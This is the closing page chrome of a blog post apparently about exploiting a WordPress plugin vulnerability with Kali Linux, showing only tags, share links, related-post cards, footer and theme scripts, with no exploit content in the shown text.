</pre></table></code></div></div><p>Enjoy … 😉</p></div><div class="post-tail-wrapper text-muted"><div class="post-meta mb-3"> <i class="far fa-folder-open fa-fw me-1"></i> <a href="/categories/security/">Security</a>, <a href="/categories/exploit/">Exploit</a>, <a href="/categories/vulnerability/">Vulnerability</a>, <a href="/categories/kali-linux/">Kali Linux</a>, <a href="/categories/ec2/">EC2</a>, <a href="/categories/docker/">Docker</a>, <a href="/categories/amazon-ecs/">Amazon ECS</a></div><div class="post-tags"> <i class="fa fa-tags fa-fw me-1"></i> <a href="/tags/ec2/" class="post-tag no-text-decoration" >EC2</a> <a href="/tags/docker/" class="post-tag no-text-decoration" >docker</a> <a href="/tags/container/" class="post-tag no-text-decoration" >container</a> <a href="/tags/security/" class="post-tag no-text-decoration" >security</a> <a href="/tags/kali-linux/" class="post-tag no-text-decoration" >Kali Linux</a> <a href="/tags/exploit/" class="post-tag no-text-decoration" >exploit</a> <a href="/tags/vulnerability/" class="post-tag no-text-decoration" >vulnerability</a> <a href="/tags/wordpress/" class="post-tag no-text-decoration" >WordPress</a> <a href="/tags/plugin/" class="post-tag no-text-decoration" >plugin</a> <a href="/tags/amazon-ecs/" class="post-tag no-text-decoration" >Amazon ECS</a> <a href="/tags/sqli/" class="post-tag no-text-decoration" >SQLi</a></div><div class=" post-tail-bottom d-flex justify-content-between align-items-center mt-5 pb-2 " ><div class="license-wrapper"> This post is licensed under <a href="https://creativecommons.org/licenses/by/4.0/"> CC BY 4.0 </a> by the author.</div><div class="share-wrapper d-flex align-items-center"> <span class="share-label text-muted">Share</span> <span class="share-icons"> <a href="https://twitter.com/intent/tweet?text=Exploit%20vulnerability%20in%20a%20WordPress%20plugin%20with%20Kali%20Linux%202%20-%20Petr's%20Blog&url=https%3A%2F%2Fruzickap.github.io%2Fposts%2Fexploit-vulnerability-wordpress-plugin-kali-linux-2%2F" target="_blank" rel="noopener" data-bs-toggle="tooltip" data-bs-placement="top" title="Twitter" aria-label="Twitter"> <i class="fa-fw fa-brands fa-square-x-twitter"></i> </a> <a href="https://www.facebook.com/sharer/sharer.php?title=Exploit%20vulnerability%20in%20a%20WordPress%20plugin%20with%20Kali%20Linux%202%20-%20Petr's%20Blog&u=https%3A%2F%2Fruzickap.github.io%2Fposts%2Fexploit-vulnerability-wordpress-plugin-kali-linux-2%2F" target="_blank" rel="noopener" data-bs-toggle="tooltip" data-bs-placement="top" title="Facebook" aria-label="Facebook"> <i class="fa-fw fab fa-facebook-square"></i> </a> <a href="https://www.linkedin.com/sharing/share-offsite/?url=https%3A%2F%2Fruzickap.github.io%2Fposts%2Fexploit-vulnerability-wordpress-plugin-kali-linux-2%2F" target="_blank" rel="noopener" data-bs-toggle="tooltip" data-bs-placement="top" title="Linkedin" aria-label="Linkedin"> <i class="fa-fw fab fa-linkedin"></i> </a> <button id="copy-link" aria-label="Copy link" class="btn small" data-bs-toggle="tooltip" data-bs-placement="top" title="Copy link" data-title-succeed="Link copied successfully!" > <i class="fa-fw fas fa-link pe-none fs-6"></i> </button> </span></div></div></div></article></main><aside aria-label="Panel" id="panel-wrapper" class="col-xl-3 ps-2 text-muted"><div class="access"><section id="access-lastmod"><h2 class="panel-heading">Recently Updated</h2><ul class="content list-unstyled ps-0 pb-1 ms-1 mt-2"><li class="text-truncate lh-lg"> <a href="/posts/amazon-eks-karpenter-tests/">Amazon EKS - Karpenter tests</a><li class="text-truncate lh-lg"> <a href="/posts/eks-auto-cert-manager-velero/">Amazon EKS Auto Mode with cert-manager and Velero</a><li class="text-truncate lh-lg"> <a href="/posts/secure-cheap-amazon-eks-auto/">Build secure and cheap Amazon EKS Auto Mode</a><li class="text-truncate lh-lg"> <a href="/posts/mcp-servers-k8s/">MCP Servers running on Kubernetes</a><li class="text-truncate lh-lg"> <a href="/posts/ollama-k8s-exploitation/">Exploiting RCE Vulnerabilities in Ollama on Kubernetes</a></ul></section><section><h2 class="panel-heading">Trending Tags</h2><div class="d-flex flex-wrap mt-3 mb-1 me-3"> <a class="post-tag btn btn-outline-primary" href="/tags/kubernetes/">kubernetes</a> <a class="post-tag btn btn-outline-primary" href="/tags/k8s/">k8s</a> <a class="post-tag btn btn-outline-primary" href="/tags/amazon-eks/">Amazon EKS</a> <a class="post-tag btn btn-outline-primary" href="/tags/eksctl/">eksctl</a> <a class="post-tag btn btn-outline-primary" href="/tags/security/">security</a> <a class="post-tag btn btn-outline-primary" href="/tags/cert-manager/">cert-manager</a> <a class="post-tag btn btn-outline-primary" href="/tags/external-dns/">external-dns</a> <a class="post-tag btn btn-outline-primary" href="/tags/amazon-eks/">amazon eks</a> <a class="post-tag btn btn-outline-primary" href="/tags/oauth2-proxy/">oauth2-proxy</a> <a class="post-tag btn btn-outline-primary" href="/tags/podinfo/">podinfo</a></div></section></div><div class="toc-border-cover z-3"></div><section id="toc-wrapper" class="invisible position-sticky ps-0 pe-4 pb-4"><h2 class="panel-heading ps-3 pb-2 mb-0">Contents</h2><nav id="toc"></nav></section></aside></div><div class="row"><div id="tail-wrapper" class="col-12 col-lg-11 col-xl-9 px-md-4"><aside id="related-posts" aria-labelledby="related-label"><h3 class="mb-4" id="related-label">Further Reading</h3><nav class="row row-cols-1 row-cols-md-2 row-cols-xl-3 g-4 mb-4"><article class="col"> <a href="/posts/exploit-vulnerability-wordpress-plugin-kali-linux-1/" class="post-preview card h-100"><div class="card-body"> <time data-ts="1714168800" data-df="ll" > Apr 27, 2024 </time><h4 class="pt-0 my-2">Exploit vulnerability in a WordPress plugin with Kali Linux</h4><div class="text-muted"><p>Learn how to exploit a vulnerability in a WordPress plugin running on Amazon EKS using Kali Linux</p></div></div></a></article><article class="col"> <a href="/posts/ollama-k8s-exploitation/" class="post-preview card h-100"><div class="card-body"> <time data-ts="1752098400" data-df="ll" > Jul 10, 2025 </time><h4 class="pt-0 my-2">Exploiting RCE Vulnerabilities in Ollama on Kubernetes</h4><div class="text-muted"><p>Demonstrating the exploitation of CVE-2024-37032 and CVE-2024-45436 vulnerabilities in a containerized Ollama instance running on Kubernetes.</p></div></div></a></article><article class="col"> <a href="/posts/eks-auto-cert-manager-velero/" class="post-preview card h-100"><div class="card-body"> <time data-ts="1738364400" data-df="ll" > Feb 1, 2025 </time><h4 class="pt-0 my-2">Amazon EKS Auto Mode with cert-manager and Velero</h4><div class="text-muted"><p>In the previous post, “Build secure and cheap Amazon EKS Auto Mode”, I used cert-manager to obtain a wildcard certificate for the Ingress. When using Let’s Encrypt production certificates, it is ...</p></div></div></a></article></nav></aside><nav class="post-navigation d-flex justify-content-between" aria-label="Post Navigation"> <a href="/posts/secure-cheap-amazon-eks-with-pod-identities/" class="btn btn-outline-primary" aria-label="Older" ><p>Build secure and cheap Amazon EKS with Pod Identities</p></a> <a href="/posts/detect-a-hacker-attacks-eks-vm/" class="btn btn-outline-primary" aria-label="Newer" ><p>Detect the hacker attacks on Amazon EKS and EC2 instances</p></a></nav><footer aria-label="Site Info" class=" d-flex flex-column justify-content-center text-muted flex-lg-row justify-content-lg-between align-items-lg-center pb-lg-3 " ><p>© <time>2025</time> <a href="https://twitter.com/Ruzicka_Petr">Petr Ruzicka</a>. <span data-bs-toggle="tooltip" data-bs-placement="top" title="Except where otherwise noted, the blog posts on this site are licensed under the Creative Commons Attribution 4.0 International (CC BY 4.0) License by the author." >Some rights reserved.</span></p><p>Using the <a data-bs-toggle="tooltip" data-bs-placement="top" title="v7.4.1" href="https://github.com/cotes2020/jekyll-theme-chirpy" target="_blank" rel="noopener" >Chirpy</a> theme for <a href="https://jekyllrb.com" target="_blank" rel="noopener">Jekyll</a>.</p></footer></div></div><div id="search-result-wrapper" class="d-flex justify-content-center d-none"><div class="col-11 content"><div id="search-hints"><section><h2 class="panel-heading">Trending Tags</h2><div class="d-flex flex-wrap mt-3 mb-1 me-3"> <a class="post-tag btn btn-outline-primary" href="/tags/kubernetes/">kubernetes</a> <a class="post-tag btn btn-outline-primary" href="/tags/k8s/">k8s</a> <a class="post-tag btn btn-outline-primary" href="/tags/amazon-eks/">Amazon EKS</a> <a class="post-tag btn btn-outline-primary" href="/tags/eksctl/">eksctl</a> <a class="post-tag btn btn-outline-primary" href="/tags/security/">security</a> <a class="post-tag btn btn-outline-primary" href="/tags/cert-manager/">cert-manager</a> <a class="post-tag btn btn-outline-primary" href="/tags/external-dns/">external-dns</a> <a class="post-tag btn btn-outline-primary" href="/tags/amazon-eks/">amazon eks</a> <a class="post-tag btn btn-outline-primary" href="/tags/oauth2-proxy/">oauth2-proxy</a> <a class="post-tag btn btn-outline-primary" href="/tags/podinfo/">podinfo</a></div></section></div><div id="search-results" class="d-flex flex-wrap justify-content-center text-muted mt-3"></div></div></div></div><aside aria-label="Scroll to Top"> <button id="back-to-top" type="button" class="btn btn-lg btn-box-shadow"> <i class="fas fa-angle-up"></i> </button></aside></div><div id="mask" class="d-none position-fixed w-100 h-100 z-1"></div><aside id="notification" class="toast" role="alert" aria-live="assertive" aria-atomic="true" data-bs-animation="true" data-bs-autohide="false" ><div class="toast-header"> <button type="button" class="btn-close ms-auto" data-bs-dismiss="toast" aria-label="Close" ></button></div><div class="toast-body text-center pt-0"><p class="px-2 mb-3">A new version of content is available.</p><button type="button" class="btn btn-primary" aria-label="Update"> Update </button></div></aside><script> (function () { const themeMapper = Theme.getThemeMapper('light', 'dark_dimmed'); const initTheme = themeMapper[Theme.visualState]; let lang = 'en';if (lang.length > 2 && !lang.startsWith('zh')) { lang = lang.slice(0, 2); } let giscusAttributes = { src: 'https://giscus.app/client.js', 'data-repo': 'ruzickap/ruzickap.github.io', 'data-repo-id': 'R_kgDOGkp4nQ', 'data-category': 'General', 'data-category-id': 'DIC_kwDOGkp4nc4CSdu1', 'data-mapping': 'pathname', 'data-strict' : '0', 'data-reactions-enabled': '1', 'data-emit-metadata': '0', 'data-theme': initTheme, 'data-input-position': 'bottom', 'data-lang': lang, 'data-loading': 'lazy', crossorigin: 'anonymous', async: '' }; let giscusNode = document.createElement('script'); Object.entries(giscusAttributes).forEach(([key, value]) => giscusNode.setAttribute(key, value) ); const $footer = document.querySelector('footer'); $footer.insertAdjacentElement("beforebegin", giscusNode); addEventListener('message', (event) => { if (event.source === window && event.data && event.data.id === Theme.ID) { const newTheme = themeMapper[Theme.visualState]; const message = { setConfig: { theme: newTheme } }; const giscus = document.getElementsByClassName('giscus-frame')[0].contentWindow; giscus.postMessage({ giscus: message }, 'https://giscus.app'); } }); })(); </script> <script> document.addEventListener('DOMContentLoaded', () => { SimpleJekyllSearch({ searchInput: document.getElementById('search-input'), resultsContainer: document.getElementById('search-results'), json: '/assets/js/data/search.json', searchResultTemplate: '<article class="px-1 px-sm-2 px-lg-4 px-xl-0"><header><h2><a href="{url}">{title}</a></h2><div class="post-meta d-flex flex-column flex-sm-row text-muted mt-1 mb-1"> {categories} {tags}</div></header><p>{content}</p></article>', noResultsText: '<p class="mt-5">Oops! No results found.</p>', templateMiddleware: function(prop, value, template) { if (prop === 'categories') { if (value === '') { return `${value}`; } else { return `<div class="me-sm-4"><i class="far fa-folder fa-fw"></i>${value}</div>`; } } if (prop === 'tags') { if (value === '') { return `${value}`; } else { return `<div><i class="fa fa-tag fa-fw"></i>${value}</div>`; } } } }); }); </script>
